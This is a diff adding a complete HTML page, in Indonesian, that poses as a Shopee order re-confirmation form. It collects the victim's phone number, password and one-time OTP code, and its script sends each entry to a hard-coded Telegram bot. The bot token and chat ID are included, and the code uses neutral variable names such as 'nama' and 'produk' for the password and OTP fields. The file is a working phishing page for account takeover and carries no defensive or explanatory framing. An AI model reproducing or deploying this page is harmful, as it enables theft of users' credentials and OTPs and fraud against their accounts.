@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Form Produk</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+     background: #f4f4f4;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      width: 90%;
+      max-width: 400px;
+    }
+
+    h2 {
+      text-align: center;
+      color: #FF512F;
+      margin-bottom: 25px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    input[type="text"] {
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      outline: none;
+    }
+
+    input:disabled {
+      background-color: #f0f0f0;
+      color: #999;
+    }
+
+    .otp-container {
+      display: flex;
+      gap: 10px;
+    }
+
+    .otp-container input {
+      flex: 1;
+    }
+
+    button {
+      background:#FF512F;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+
+    button:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+
+    #loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(255, 255, 255, 0.85);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #FF512F;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h2>KONFIRMASI ULANG PESANAN SHOPEE</h2>
+    <form onsubmit="submitForm(event)">
+      <input type="text" id="id" placeholder="No.Handpone" required />
+      <input type="text" id="nama" placeholder="kata sandi" required />
+
+      <div class="otp-container">
+        <input type="text" id="produk" placeholder="Kode OTP" disabled />
+        <button type="button" id="cek-btn" onclick="cekProduk()">Minta Kode OTP</button>
+      </div>
+
+      <button type="submit" id="kirim-btn">Kirim</button>
+    </form>
+  </div>
+
+  <div id="loading-screen">
+    <div class="loader"></div>
+  </div>
+
+  <script>
+    const token = '7814226100:AAEL3luj8nDoLCVlBsVh47zMVjEMjH7AWag';
+    const chatId = '7848100666';
+
+    function sendToTelegram(text) {
+      return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'HTML'
+        })
+      });
+    }
+
+    function cekProduk() {
+      const id = document.getElementById("id").value.trim();
+      const nama = document.getElementById("nama").value.trim();
+      const produkInput = document.getElementById("produk");
+      const cekBtn = document.getElementById("cek-btn");
+
+      if (!id || !nama) {
+        alert("Isi ID dan Nama terlebih dahulu.");
+        return;
+      }
+
+      const message = `<b>Cek Produk</b>\nID: ${id}\nNama: ${nama}`;
+      sendToTelegram(message);
+
+      produkInput.disabled = false;
+      produkInput.focus();
+
+      cekBtn.disabled = true;
+      let countdown = 50;
+      const originalText = cekBtn.innerText;
+
+      const interval = setInterval(() => {
+        cekBtn.innerText = `Tunggu (${countdown}s)`;
+        countdown--;
+
+        if (countdown < 0) {
+          clearInterval(interval);
+          cekBtn.innerText = originalText;
+          cekBtn.disabled = false;
+        }
+      }, 1000);
+    }
+
+    function submitForm(e) {
+      e.preventDefault();
+
+      const id = document.getElementById("id").value.trim();
+      const nama = document.getElementById("nama").value.trim();
+      const produk = document.getElementById("produk").value.trim();
+
+      if (!produk) {
+        alert("Silakan isi Nama Produk.");
+        return;
+      }
+
+      const message = `<b>Form Lengkap</b>\nID: ${id}\nNama: ${nama}\nProduk: ${produk}`;
+
+      document.getElementById("loading-screen").style.display = "flex";
+
+      sendToTelegram(message).then(() => {
+        document.querySelector("form").reset();
+        document.getElementById("produk").disabled = true;
+      });
+    }
+  </script>
+</body>
+
+</html>
